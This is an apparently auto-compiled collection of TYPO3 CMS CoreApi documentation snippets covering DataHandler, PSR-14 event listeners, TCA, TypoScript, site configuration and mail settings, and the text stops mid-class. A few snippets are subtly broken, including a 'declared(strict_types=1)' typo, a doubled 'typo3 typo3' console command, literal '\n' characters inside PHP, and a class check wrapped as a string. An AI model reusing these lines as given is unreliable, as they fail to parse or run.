html\nCODE:\n```\n<a href=\"#\"\n   class=\"t3js-modal-trigger\"\n   data-title=\"Warning\"\n   data-bs-content=\"Are you sure you want to delete record?\"\n   data-static-backdrop=\"1\">\n  Delete\n</a>\n```\n\n----------------------------------------\n\nTITLE: Defining Extension Key in composer.json\nDESCRIPTION: This snippet highlights the extraction of a specific property related to the extension key within the composer.json file. It's a necessary configuration to ensure compatibility with future TYPO3 versions, providing an exact string format for 'extension-key'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ComposerJson.rst#2025-04-16_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"extra\": {\n        \"typo3/cms\": {\n            \"extension-key\": \"my_extension\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying with StartTimeRestriction in PHP\nDESCRIPTION: Example of how the StartTimeRestriction evaluates the TCA configuration and adds a WHERE clause to filter records based on start time.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n['ctrl']['enablecolumns']['starttime']\n```\n\nLANGUAGE: SQL\nCODE:\n```\nAND (`tt_content`.`starttime` <= 1475580240)\n```\n\n----------------------------------------\n\nTITLE: DataHandler Copy Operation with Mapping in PHP\nDESCRIPTION: Example demonstrating how to copy a record and access its new UID using copyMappingArray_merged.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$cmd['tt_content'][1203]['copy'] = 400;  // Copies tt_content uid=1203 to first position in page uid=400\n$this->dataHandler->start([], $cmd);\n$this->dataHandler->process_cmdmap();\n\n$uid = $this->dataHandler->copyMappingArray_merged['tt_content'][1203];\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Info Window Using List Arguments\nDESCRIPTION: HTML button that triggers TYPO3.InfoWindow.showItem module function to display record details using list-style arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Navigation/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<a\n    class=\"btn btn-default\"\n    href=\"#\"\n    data-dispatch-action=\"TYPO3.InfoWindow.showItem\"\n    data-dispatch-args-list=\"be_users,123\"\n>\n    Some text\n</a>\n```\n\n----------------------------------------\n\nTITLE: Setting Path for Image Processing Tools\nDESCRIPTION: This configuration provides the file path where the ImageMagick or GraphicsMagick tools are located on the server. This is essential for TYPO3 to locate the necessary binaries for processing images.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['processor_path'] = '/usr/bin/';\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Restart Threshold Sleep Duration\nDESCRIPTION: This snippet sets the sleep time in seconds between stopping and restarting the SMTP transport. It allows for a gap in sending messages which can help in avoiding server overload.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_14\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_restart_threshold_sleep']\n:type: text\n:Default: ''\n\n*only with transport=smtp* Sets the number of seconds to sleep between stopping and re-starting the transport.\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyRecordOverlayIconIdentifierEvent Listener in TYPO3\nDESCRIPTION: Sample implementation of an event listener that modifies record overlay icon identifiers in TYPO3. The event listener can be registered to customize the overlay icons used for records in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Imaging/ModifyRecordOverlayIconIdentifierEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Core\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Imaging\\Event\\ModifyRecordOverlayIconIdentifierEvent;\n\nfinal class ModifyRecordOverlayIconIdentifierEventListener\n{\n    public function __invoke(ModifyRecordOverlayIconIdentifierEvent $event): void\n    {\n        // Add custom logic here to modify the overlay icon identifier\n        $event->setOverlayIconIdentifier('my-custom-overlay-identifier');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Error and Debug Settings in TYPO3 Production Environment\nDESCRIPTION: This code snippet demonstrates how to disable error and debug output in a TYPO3 production environment by setting specific configuration variables. These settings ensure no debug information is exposed to users, enhancing security.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ProductionSettings.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['displayErrors'] = '0';\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['sqlDebug'] = '0';\n$GLOBALS['TYPO3_CONF_VARS']['FE']['debug'] = '0';\n$GLOBALS['TYPO3_CONF_VARS']['BE']['debug'] = '0';\n```\n\n----------------------------------------\n\nTITLE: Configuring Crop Variants in TYPO3 CMS\nDESCRIPTION: Configuration for mobile and desktop crop variants with aspect ratio settings. Defines allowedAspectRatios for 4:3 and free-form ratios with language labels.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/General/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'config' => [\n     'type' => 'imageManipulation',\n     'cropVariants' => [\n         'mobile' => [\n             'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n             'allowedAspectRatios' => [\n                 '4:3' => [\n                     'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.4_3',\n                     'value' => 4 / 3\n                 ],\n                 'NaN' => [\n                     'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.free',\n                     'value' => 0.0\n                 ],\n             ],\n         ],\n         'desktop' => [\n             'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.desktop',\n             'allowedAspectRatios' => [\n                 '4:3' => [\n                     'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.4_3',\n                     'value' => 4 / 3\n                 ],\n                 'NaN' => [\n                     'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.free',\n                     'value' => 0.0\n                 ],\n             ],\n         ],\n     ]\n]\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeModuleCreationEvent Listener in TYPO3 CMS\nDESCRIPTION: Example implementation of an event listener that manipulates module configuration before module creation in TYPO3 CMS backend. This listener handles the PSR-14 BeforeModuleCreationEvent.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeModuleCreationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Module\\BeforeModuleCreationEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeModuleCreationEvent $event): void\n    {\n        // Access configuration\n        $configuration = $event->getConfiguration();\n        \n        // Modify configuration\n        $configuration['labels']['title'] = 'My custom module title';\n        $configuration['access'] = 'user';\n        \n        // Set modified configuration\n        $event->setConfiguration($configuration);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Common SQL Field Names in TYPO3 Database Tables\nDESCRIPTION: Frequently used SQL field names in TYPO3 database tables for various functionality including frontend group access, sorting, content description, language handling, translation tracking, and workspace versioning.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTablesSql.rst#2025-04-16_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nfe_group\n```\n\nLANGUAGE: sql\nCODE:\n```\nsorting\n```\n\nLANGUAGE: sql\nCODE:\n```\ndescription\n```\n\nLANGUAGE: sql\nCODE:\n```\neditlock\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_language_uid\n```\n\nLANGUAGE: sql\nCODE:\n```\nl10n_parent\n```\n\nLANGUAGE: sql\nCODE:\n```\nl10n_source\n```\n\nLANGUAGE: sql\nCODE:\n```\nl10n_state\n```\n\nLANGUAGE: sql\nCODE:\n```\nt3_origuid\n```\n\nLANGUAGE: sql\nCODE:\n```\nl10n_diffsource\n```\n\nLANGUAGE: sql\nCODE:\n```\nt3ver_*\n```\n\nLANGUAGE: sql\nCODE:\n```\nt3ver_oid\n```\n\nLANGUAGE: sql\nCODE:\n```\nt3ver_wsid\n```\n\n----------------------------------------\n\nTITLE: Empty String Behavior with ViewHelper Attributes\nDESCRIPTION: Demonstrates how empty strings in ViewHelper attributes are handled, with the attribute being omitted from the rendered tag.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<f:variable name=\"myEmptyString\"></f:variable>\n<my:viewhelper async=\"{myEmptyString}\" />\nResult: <tag />\n```\n\n----------------------------------------\n\nTITLE: Disabling Specific MFA Providers via TSconfig\nDESCRIPTION: TSconfig configuration to disable specific MFA providers for users or user groups, overriding the Access List settings. In this example, the TOTP provider is disabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nauth.mfa.disableProviders := addToList(totp)\n```\n\n----------------------------------------\n\nTITLE: Creating Multiple Related Pages with DataHandler in PHP\nDESCRIPTION: Example showing how to create multiple pages with relationships to each other.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$data['pages']['NEW9823be87'] = [\n    'title' => 'Page 1',\n    'pid' => '-45'\n];\n$data['pages']['NEWbe68s587'] = [\n    'title' => 'Page 2',\n    'pid' => '-NEW9823be87'\n];\n```\n\n----------------------------------------\n\nTITLE: Defining EntityPersistedEvent Class in TYPO3 Extbase Framework\nDESCRIPTION: Documentation of the EntityPersistedEvent class that is triggered after an object has been persisted to the storage backend. It includes a method getObject() that returns the persisted domain object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/EntityPersistedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Extbase\\Event\\Persistence\n\n..  php:class:: EntityPersistedEvent\n\n    Event which is fired after an object was pushed to the storage backend\n\n    ..  php:method:: getObject()\n        :returns: `\\TYPO3\\CMS\\Extbase\\DomainObject\\DomainObjectInterface`\n```\n\n----------------------------------------\n\nTITLE: Manual Context Menu Provider Registration\nDESCRIPTION: Manual registration of context menu item provider when autoconfigure is disabled, using the backend.contextmenu.itemprovider service tag.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  T3docs\\Examples\\ContextMenu\\HelloWorldItemProvider:\n    tags:\n      - name: backend.contextmenu.itemprovider\n```\n\n----------------------------------------\n\nTITLE: getByAlpha2IsoCode() Method\nDESCRIPTION: Retrieves a country object using its Alpha2 ISO code. Takes the Alpha2 ISO code as input, returning the corresponding Country object or null if not found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getByAlpha2IsoCode(string $isoCode)\n        :returns: `?\\TYPO3\\CMS\\Core\\Country\\Country`\n\n        :param $isoCode: the isoCode\n```\n\n----------------------------------------\n\nTITLE: Adding a Plugin to TCA in TYPO3\nDESCRIPTION: This code snippet demonstrates how to add a plugin to the TCA using the ExtensionManagementUtility. The method addPlugin() has been changed in TYPO3 version 14.0, removing the second and third arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/StoringChanges/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addPlugin()\n```\n\n----------------------------------------\n\nTITLE: Using BeforeFileReplacedEvent in TYPO3 CMS\nDESCRIPTION: The BeforeFileReplacedEvent is dispatched before a file is replaced in TYPO3's file system. This event provides access to both the file object and the local file path, allowing for pre-replacement validation and analysis.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileReplacedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFileReplacedEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Page Title Provider in TypoScript\nDESCRIPTION: TypoScript configuration to register and set the priority of the custom page title provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/PageTitleApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: TypoScript\nCODE:\n```\nconfig.pageTitleProviders {\n    myOwnPageTitle {\n        provider = MyVendor\\MyExtension\\PageTitle\\MyOwnPageTitleProvider\n        before = record\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Placeholders in YAML Site Configuration\nDESCRIPTION: Illustrates how to use custom placeholders in a TYPO3 site configuration YAML file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsomeVariable: '%example(somevalue)%'\nanotherVariable: 'inline::%example(anotherValue)%::placeholder'\n```\n\n----------------------------------------\n\nTITLE: Setting Request Object for FluidEmail in PHP\nDESCRIPTION: Demonstrates how to set the current request object for a FluidEmail instance, which is necessary for certain ViewHelpers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Mail\\FluidEmail;\n\n$email = new FluidEmail();\n$email->setRequest($this->request);\n```\n\n----------------------------------------\n\nTITLE: Validating Number Range for Percentage in PHP\nDESCRIPTION: Example showing how to validate a percentage field with the NumberRange validator to ensure the value falls between 1 and 100.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation\\Validate;\n\nclass SettingsForm\n{\n    #[Validate([\n        'validator' => 'NumberRange',\n        'options' => ['minimum' => 1, 'maximum' => 100],\n    ])]\n    protected int $percentage;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyHrefLangTagsEvent Listener in PHP\nDESCRIPTION: Example implementation of an event listener for ModifyHrefLangTagsEvent in TYPO3 CMS. Shows how to modify hreflang tags using a custom event listener with configuration for execution order using 'after' and 'before' attributes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyHrefLangTagsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\Event\\ModifyHrefLangTagsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyHrefLangTagsEvent $event): void\n    {\n        $hrefLangTags = $event->getHrefLangs();\n        // Modify the href lang tags here\n        $event->setHrefLangs($hrefLangTags);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Local Extension via Composer\nDESCRIPTION: Command to require and install the newly created extension in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req t3docs/my-test:@dev\n```\n\n----------------------------------------\n\nTITLE: Declaring FileSearchDemand Class in TYPO3 Core\nDESCRIPTION: PHP class declaration for FileSearchDemand in the TYPO3\\CMS\\Core\\Resource\\Search namespace. This class provides an immutable interface for file searching functionality with various getter and setter methods for search parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Resource/FileSearchDemand.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Search;\n\nclass FileSearchDemand\n{\n    public static function create(): self;\n    public static function createForSearchTerm(string $searchTerm): self;\n    public function getSearchTerm(): ?string;\n    public function getFolder(): ?\\TYPO3\\CMS\\Core\\Resource\\Folder;\n    public function getFirstResult(): ?int;\n    public function getMaxResults(): ?int;\n    public function getSearchFields(): ?array;\n    public function getOrderings(): ?array;\n    public function isRecursive(): bool;\n    public function withSearchTerm(string $searchTerm): self;\n    public function withFolder(\\TYPO3\\CMS\\Core\\Resource\\Folder $folder): self;\n    public function withStartResult(int $firstResult): self;\n    public function withMaxResults(int $maxResults): self;\n    public function addSearchField(string $tableName, string $field): self;\n    public function addOrdering(string $tableName, string $fieldName, string $direction = 'ASC'): self;\n    public function withRecursive(): self;\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing BeforeFolderCopiedEvent in PHP\nDESCRIPTION: Shows the PHP namespace reference for the BeforeFolderCopiedEvent class which is fired before a folder is copied to the resource storage/driver. This event allows for implementing deferred processing or queuing of large folder operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFolderCopiedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFolderCopiedEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Global XSL File for TYPO3 Sitemaps\nDESCRIPTION: TypoScript configuration for setting a custom XSL file for all sitemaps in the TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_6\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo.config.xslFile = EXT:my_extension/Resources/Public/CSS/mySite.xsl\n```\n\n----------------------------------------\n\nTITLE: Frontend User Authentication Class Reference - PHP\nDESCRIPTION: References the PHP class responsible for frontend user authentication in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/FrontendUsers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\Authentication\\FrontendUserAuthentication\n```\n\n----------------------------------------\n\nTITLE: Including TypoScript Constants\nDESCRIPTION: This snippet shows how to include TypoScript constants stored in 'constants.typoscript'. It outlines the convention for the file's path and name, required for TYPO3 extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/TypoScript/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n..  typo3:file:: constants.typoscript\n    :scope: extension\n    :path: /Configuration/TypoScript\n    :regex: /^.*Configuration\\/TypoScript\\/.*constants\\.typoscript/\n    :shortDescription: Contains the TypoScript constants of the extension. The path is convention, the file name mandatory.\n```\n\n----------------------------------------\n\nTITLE: BeforePageIsResolvedEvent Class Definition with Method Signatures\nDESCRIPTION: PHP class definition for BeforePageIsResolvedEvent that provides methods to handle page resolution in TYPO3 frontend. The event allows modification of incoming parameters and page resolution context through getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/BeforePageIsResolvedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass BeforePageIsResolvedEvent {\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getPageInformation(): \\TYPO3\\CMS\\Frontend\\Page\\PageInformation;\n    public function setPageInformation(\\TYPO3\\CMS\\Frontend\\Page\\PageInformation $pageInformation);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic SEL Provider Class\nDESCRIPTION: Basic implementation of a custom Symfony Expression Language provider class extending AbstractProvider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\SomeExtension\\ExpressionLanguage;\n\nuse TYPO3\\CMS\\Core\\ExpressionLanguage\\AbstractProvider;\n\nclass CustomTypoScriptConditionProvider extends AbstractProvider\n{\n    public function __construct()\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Application Context with PHP environment variables\nDESCRIPTION: PHP script that sets the TYPO3_CONTEXT environment variable, used in auto_prepend_file or other early loading mechanisms.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\nputenv('TYPO3_CONTEXT=Development');\n```\n\n----------------------------------------\n\nTITLE: Disabling Workspace Versioning for a Table in TYPO3 PHP\nDESCRIPTION: This code snippet demonstrates how to disable workspace versioning for a specific table in TYPO3 using a TCA override file. It sets the 'versioningWS' control property to false for the example table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['example_table']['ctrl']['versioningWS'] = false;\n```\n\n----------------------------------------\n\nTITLE: Checking for GDLib Class Existence in PHP\nDESCRIPTION: This code snippet demonstrates the recommended approach to check for the availability of GDLib functionality in TYPO3 v13.0 and later, replacing the deprecated `$GLOBALS['TYPO3_CONF_VARS']['GFX']['gdlib']` configuration option. It checks if the `GdImage` class exists, indicating that GDLib is available.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n\"if (class_exists(\\GdImage::class))\"\n```\n\n----------------------------------------\n\nTITLE: Getting Backend Username in TYPO3\nDESCRIPTION: Accesses the username of the currently authenticated backend user from the user record array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->user['username']\n```\n\n----------------------------------------\n\nTITLE: Configuring Extbase Plugin as Content Element in TYPO3\nDESCRIPTION: Adjusts the Extbase plugin configuration to use PLUGIN_TYPE_CONTENT_ELEMENT in ext_localconf.php.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionUtility::configurePlugin(\n    'Examples',\n    'PiExampleContent',\n    [\n        \\MyVendor\\Examples\\Controller\\ContentElementController::class => 'list'\n    ],\n    [\n        \\MyVendor\\Examples\\Controller\\ContentElementController::class => 'list'\n    ],\n+    ExtensionUtility::PLUGIN_TYPE_CONTENT_ELEMENT\n);\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Backend Users via Console Command in Composer Setup\nDESCRIPTION: Command for creating a new backend user in TYPO3 when using a Composer-based installation. This launches an interactive prompt for entering user details.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/UserSetup/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 typo3 backend:user:create\n```\n\n----------------------------------------\n\nTITLE: Cache Clearing with DataHandler (PHP)\nDESCRIPTION: Demonstrates how to clear cache using DataHandler's cache clearing API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start([], []);\\n$dataHandler->clear_cacheCmd('all');\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Site Package Templates and Content Settings\nDESCRIPTION: YAML configuration that defines template root paths and content element settings for a TYPO3 site package. Specifies layout, partial, and template paths along with textmedia content element configurations including maximum widths and lightbox settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_site-package/_settings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nstyles:\n    templates:\n        layoutRootPath: EXT:site_package/Resources/Private/ContentElements/Layouts\n        partialRootPath: EXT:site_package/Resources/Private/ContentElements/Partials\n        templateRootPath: EXT:site_package/Resources/Private/ContentElements/Templates\n    content:\n        textmedia:\n            maxW: 1200\n            maxWInText: 600\n            linkWrap:\n                lightboxEnabled: true\n                lightboxCssClass: lightbox\n```\n\n----------------------------------------\n\nTITLE: Configuring Conditional Logic in TYPO3 TypoScript\nDESCRIPTION: This snippet demonstrates the use of conditional criteria in TypoScript to control the execution of code based on certain conditions. It includes structures for evaluating conditions and applying corresponding configurations. The key parameters include [condition criteria] to define the conditions, [ELSE] for alternative configurations, and [GLOBAL] for universally applied settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Conditions2.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n.. code-block:: typoscript\n   :caption: Extension examples, file Configuration/TypoScript/Conditions2/setup.typoscript\n\n   # Some TypoScript, always parsed\n   [condition criteria]\n      # Some TypoScript, only parsed if the condition criteria is met\n   [ELSE]\n      # Some TypoScript, only parsed if the condition criteria is *not* met\n      # [ELSE] is optional\n   [GLOBAL]\n   # ... some TypoScript, always parsed\n```\n\n----------------------------------------\n\nTITLE: Migrating renderStatic() Invocations (PHP)\nDESCRIPTION: Example of migrating calls to removed renderStatic() methods of other ViewHelpers to use the ViewHelperInvoker instead.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_13\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_MigrateRenderStaticInvocation.diff\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php (diff replacing renderStatic() calls)\n```\n\n----------------------------------------\n\nTITLE: Defining AfterPackageDeactivationEvent Class in TYPO3 CMS Core API (PHP)\nDESCRIPTION: This snippet defines the AfterPackageDeactivationEvent class in the TYPO3\\CMS\\Core\\Package\\Event namespace. The class represents an event triggered after a package has been deactivated and provides methods to retrieve information about the deactivated package.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterPackageDeactivationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Package\\Event;\n\nclass AfterPackageDeactivationEvent\n{\n    public function getPackageKey(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getType(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getEmitter(): ?object\n    {\n        